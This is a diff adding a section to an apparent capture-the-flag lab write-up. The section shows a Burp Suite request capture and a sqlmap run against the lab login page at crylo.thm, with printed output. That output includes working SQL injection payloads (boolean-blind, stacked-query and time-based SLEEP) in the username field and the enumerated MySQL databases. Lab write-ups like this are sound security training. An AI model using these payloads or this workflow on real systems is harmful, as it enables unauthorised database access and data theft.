@@ -106,10 +106,111 @@ Finished
 <img width="1769" height="669" alt="image" src="https://github.com/user-attachments/assets/21268d76-9e37-4a33-bfdf-eeb103b4fcd5" />
 
 
+<h3>http://crylo.thm/login</h3>
+
 <p>- Launched Burp Suite<br>
 - Clicked Login<br>
 - Enabled FoxyProxy in the right upper corner of the web browser<br>
 - Tried to log in with the credentials admin:admin<br>
-- Right-clicked over the Burp Suite´s Request panel, defined the name request.txt, and clicked Save</p>
+- Right-clicked over the Burp Suite´s Request  -  using the outcome from the login, clicked Save item, defined the name <code>request</code>, and clicked Save.</p>
+
+<img width="1118" height="592" alt="image" src="https://github.com/user-attachments/assets/4e6a65ef-479c-4194-8ff0-3a8650a1be51" />
+
+<img width="1174" height="371" alt="image" src="https://github.com/user-attachments/assets/d7571bab-aef3-407c-b002-9d6df7e61451" />
+
+<h3>sqlmap</h3>
+
+```bash
+:~/Crylo# sqlmap -r request --dbs --batch --level=2 --risk=2
+...
+[21:00:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[21:00:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[21:00:25] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --code=200)
+...
+[21:00:39] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
+[21:00:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:00:49] [INFO] (custom) POST parameter 'MULTIPART username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[21:00:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:00:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:00:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[21:00:50] [INFO] target URL appears to have 11 columns in query
+...
+[21:01:02] [INFO] target URL appears to be UNION injectable with 11 columns
+...
+sqlmap identified the following injection point(s) with a total of 459 HTTP(s) requests:
+---
+Parameter: MULTIPART username ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: -----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="username"
+
+admin' AND 1422=(SELECT (CASE WHEN (1422=1422) THEN 1422 ELSE (SELECT 2938 UNION SELECT 5338) END))-- HuEo
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="password"
+
+admin
+-----------------------------30918485911735354248217650571--
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: -----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="username"
+
+admin';SELECT SLEEP(5)#
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="password"
+
+admin
+-----------------------------30918485911735354248217650571--
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: -----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="csrfmiddlewaretoken"
+
+HTJRfqXN0NVYbvNHEhxr4aHUxHVGGtmUAve5tjsd7pvSrCImKZNYzwUG9sL5jWRL
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="username"
+
+admin' AND (SELECT 3557 FROM (SELECT(SLEEP(5)))kmLc) AND 'gMwA'='gMwA
+-----------------------------30918485911735354248217650571
+Content-Disposition: form-data; name="password"
+
+admin
+-----------------------------30918485911735354248217650571--
+---
+[21:01:24] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[21:01:24] [INFO] fetching database names
+[21:01:24] [INFO] fetching number of databases
+[21:01:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[21:01:24] [INFO] retrieved: 5
+[21:01:25] [INFO] retrieved: mysql
+[21:01:27] [INFO] retrieved: information_schema
+[21:01:37] [INFO] retrieved: performance_schema
+[21:01:46] [INFO] retrieved: sys
+[21:01:48] [INFO] retrieved: food
+available databases [5]:
+[*] food
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+```
+
+
+
+
+
+
 
 
